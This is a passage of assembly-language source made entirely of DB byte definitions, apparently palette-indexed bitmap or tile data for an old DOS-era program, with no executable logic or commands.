DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,000H,007H,006H,006H,006H,006H,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00FH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,019H,01AH,01AH
DB 016H,00DH,00EH,008H,008H,00EH,008H,008H,008H,005H,005H,004H,004H,000H,000H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,004H,004H
DB 004H,004H,004H,004H,002H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,000H,006H,006H,007H,006H,001H,003H,01CH,01CH,01CH,003H
DB 01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,003H,008H,00FH,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,017H,019H,018H,014H,00DH,00DH
DB 00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00EH,00DH,004H,001H,004H,001H,009H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,005H,004H,001H,004H
DB 004H,004H,000H,000H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,002H,006H,006H,006H,007H,003H,01CH,01CH,01CH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH
DB 003H,01CH,01CH,01CH,003H,01BH,00EH,00FH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,014H,00FH,00FH,00FH,013H,013H,013H,013H,013H,013H
DB 014H,013H,013H,013H,013H,013H,00DH,00DH,013H,00DH,00DH,004H,003H,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,004H,004H,004H,004H,004H,002H
DB 000H,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,005H,006H
DB 006H,006H,009H,01CH,003H,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,003H,01BH,003H,01CH
DB 01CH,01CH,003H,008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,00DH,015H,01AH,019H,00DH,004H,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H
DB 000H,000H,000H,000H,003H,01BH,003H,004H,004H,004H,004H,004H,000H,01BH,003H
DB 01BH,003H,01BH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01CH,003H,01CH,003H,01CH,003H,01BH,003H,01BH,000H,006H,006H,006H,008H,01CH
DB 01CH,01CH,003H,01BH,003H,004H,007H,006H,007H,001H,000H,000H,000H,01BH,003H
DB 01CH,01CH,01CH,003H,002H,008H,007H,005H,01BH,003H,01CH,01CH,01CH,003H,01BH
DB 008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 00DH,017H,01AH,01AH,013H,001H,003H,01CH,01CH,01CH,01CH,01CH,009H,007H,007H
DB 008H,003H,01BH,003H,01CH,01CH,01CH,003H,01BH,003H,001H,007H,006H,007H,008H
DB 009H,000H,003H,01BH,003H,004H,004H,004H,004H,002H,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01BH,003H,01BH,00FH,006H,00AH,002H,01CH,01CH,003H,01BH
DB 009H,006H,00AH,006H,00AH,00AH,00AH,006H,002H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,007H,005H,005H,00AH,005H,01BH,003H,01CH,01CH,01CH,003H,008H,00AH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00DH,017H,01AH
DB 01AH,013H,005H,01CH,01CH,01CH,01CH,01CH,01CH,006H,007H,004H,008H,005H,003H
DB 01BH,003H,01CH,003H,01BH,002H,006H,00AH,00AH,00AH,006H,00AH,00AH,004H,000H
DB 003H,01BH,003H,004H,004H,004H,004H,000H,003H,01BH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H
DB 000H,003H,01BH,009H,00AH,00FH,008H,003H,01CH,01CH,01CH,009H,006H,007H,005H
DB 005H,005H,008H,007H,00AH,00AH,002H,000H,003H,01CH,01CH,01CH,00BH,008H,009H
DB 002H,005H,007H,003H,01CH,01CH,01CH,003H,01BH,008H,00AH,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00DH,017H,01AH,01AH,013H,004H
DB 01CH,01CH,01CH,01CH,01CH,005H,007H,001H,002H,002H,005H,01BH,003H,01CH,003H
DB 01BH,009H,00AH,00AH,007H,008H,005H,005H,005H,008H,006H,009H,000H,003H,01BH
DB 003H,004H,004H,004H,002H,000H,003H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 005H,00AH,007H,003H,01CH,01CH,01CH,003H,006H,008H,005H,004H,001H,004H,005H
DB 008H,007H,00AH,006H,000H,01BH,003H,01CH,01CH,005H,008H,005H,009H,001H,007H
DB 01CH,01CH,01CH,01CH,01CH,003H,008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,00DH,017H,01AH,01AH,013H,005H,01CH,01CH,01CH
DB 01CH,01CH,00BH,008H,009H,004H,005H,005H,003H,01CH,01CH,01CH,003H,006H,00AH
DB 007H,008H,004H,004H,001H,004H,004H,008H,006H,003H,01BH,003H,01CH,003H,004H
DB 004H,004H,002H,000H,000H,000H,000H,000H,002H,002H,002H,000H,000H,000H,000H
DB 000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H
DB 000H,002H,008H,006H,006H,006H,008H,002H,000H,000H,000H,000H,00FH,00AH,002H
DB 01CH,01CH,01CH,003H,005H,006H,005H,004H,001H,009H,001H,009H,004H,005H,007H
DB 00AH,002H,003H,01CH,01CH,01CH,00BH,007H,008H,004H,007H,005H,01CH,01CH,01CH
DB 01CH,003H,01BH,008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,015H,011H,011H,011H,016H,016H,016H,016H,016H,016H,016H,016H,016H
DB 016H,016H,016H,00DH,014H,016H,014H,00DH,005H,003H,01CH,01CH,01CH,01CH,01CH
DB 007H,005H,005H,007H,008H,01CH,01CH,01CH,003H,002H,00AH,007H,005H,001H,009H
DB 001H,009H,001H,004H,005H,006H,005H,003H,01CH,01CH,01CH,003H,004H,004H,004H
DB 000H,000H,002H,007H,00AH,00AH,00AH,011H,00AH,006H,004H,000H,000H,000H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,009H,006H,00AH,00AH
DB 00AH,00AH,00AH,011H,00AH,006H,009H,000H,002H,00AH,007H,01CH,01CH,01CH,01CH
DB 01CH,007H,007H,005H,001H,009H,002H,009H,002H,009H,004H,008H,00AH,005H,01BH
DB 003H,01CH,01CH,01CH,00BH,007H,007H,008H,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00AH
DB 014H,015H,015H,014H,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH,00DH
DB 00FH,00EH,00CH,008H,00EH,009H,01CH,01CH,01CH,01CH,01CH,01CH,001H,007H,007H
DB 007H,001H,01CH,01CH,01CH,01CH,005H,00AH,008H,004H,009H,002H,009H,002H,009H
DB 001H,005H,007H,007H,01BH,003H,01CH,01CH,01CH,003H,004H,004H,002H,005H,00AH
DB 00AH,00AH,006H,006H,006H,006H,00AH,00AH,006H,002H,000H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00AH,006H,007H,007H,007H,007H,006H
DB 006H,006H,00AH,00AH,002H,005H,00AH,002H,003H,01CH,01CH,01CH,01CH,006H,008H
DB 004H,009H,002H,002H,002H,009H,001H,004H,004H,006H,007H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,001H,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00AH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00AH,018H,01AH,01AH
DB 018H,00DH,00DH,010H,00DH,010H,00EH,00EH,00EH,00EH,00EH,008H,004H,000H,000H
DB 000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,01CH,01CH,01CH
DB 01CH,01CH,01CH,007H,006H,004H,004H,002H,009H,002H,002H,002H,009H,004H,008H
DB 007H,003H,01CH,01CH,01CH,003H,01BH,000H,004H,004H,008H,006H,006H,007H,008H
DB 008H,008H,008H,008H,008H,006H,00AH,002H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,007H,00AH,008H,008H,005H,005H,005H,008H,008H,008H,007H,007H
DB 006H,006H,006H,006H,000H,01BH,003H,01CH,01CH,01CH,007H,008H,004H,001H,009H
DB 004H,002H,002H,009H,001H,005H,007H,007H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,008H,00AH,019H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00AH,018H,01AH,01AH,017H,00DH,008H
DB 005H,008H,008H,008H,005H,005H,005H,002H,000H,000H,000H,000H,000H,000H,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 007H,007H,005H,001H,009H,002H,009H,004H,004H,001H,004H,008H,007H,01BH,003H
DB 01CH,01CH,01CH,003H,000H,004H,004H,001H,008H,008H,008H,005H,005H,005H,005H
DB 005H,005H,008H,007H,00AH,002H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,005H
DB 00AH,008H,005H,005H,004H,004H,004H,004H,005H,005H,008H,008H,007H,008H,006H
DB 004H,000H,003H,01CH,01CH,01CH,01CH,008H,007H,004H,004H,007H,007H,001H,009H
DB 001H,004H,005H,006H,005H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00EH,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,00AH,018H,01AH,01AH,018H,00DH,00EH,00EH,00EH,00EH
DB 00EH,00EH,008H,008H,005H,000H,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,006H,005H
DB 004H,001H,009H,001H,007H,006H,005H,004H,007H,008H,003H,01CH,01CH,01CH,003H
DB 01BH,008H,011H,004H,004H,001H,005H,005H,004H,004H,001H,004H,004H,005H,005H
DB 008H,006H,006H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00AH,007H,008H,005H
DB 004H,004H,001H,009H,001H,004H,004H,005H,005H,008H,005H,00AH,008H,000H,000H
DB 003H,01CH,01CH,01CH,00BH,006H,008H,004H,007H,007H,009H,001H,004H,004H,008H
DB 006H,009H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,00AH,011H,017H,017H,014H,00DH,00FH,00DH,00DH,00DH,00DH,00DH,00DH
DB 00DH,00DH,00DH,00CH,00CH,005H,005H,00CH,009H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,006H,008H,004H,004H,001H
DB 009H,007H,006H,005H,005H,006H,00BH,01CH,01CH,01CH,01CH,01CH,009H,011H,00AH
DB 007H,002H,002H,004H,001H,009H,001H,009H,001H,004H,004H,005H,005H,008H,00AH
DB 004H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,004H,006H,008H,005H,004H,004H,001H,009H
DB 001H,009H,001H,009H,001H,004H,005H,005H,006H,00AH,005H,000H,01CH,01CH,01CH
DB 01CH,01CH,005H,006H,008H,005H,005H,004H,005H,005H,007H,006H,009H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 008H,00AH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H
DB 014H,014H,014H,014H,011H,011H,011H,014H,014H,014H,014H,014H,014H,014H,014H
DB 00DH,013H,014H,014H,00DH,004H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,006H,007H,005H,005H,004H,005H,005H
DB 008H,006H,005H,01CH,01CH,01CH,01CH,01CH,003H,008H,00AH,007H,008H,004H,002H
DB 001H,009H,001H,009H,001H,009H,001H,004H,004H,005H,005H,007H,006H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,008H,007H,005H,004H,004H,001H,009H,002H,009H,002H,009H
DB 001H,009H,001H,004H,005H,005H,00AH,006H,000H,003H,01CH,01CH,01CH,01CH,01CH
DB 00BH,006H,006H,008H,008H,007H,006H,006H,009H,01CH,01CH,01CH,01CH,01CH,01CH
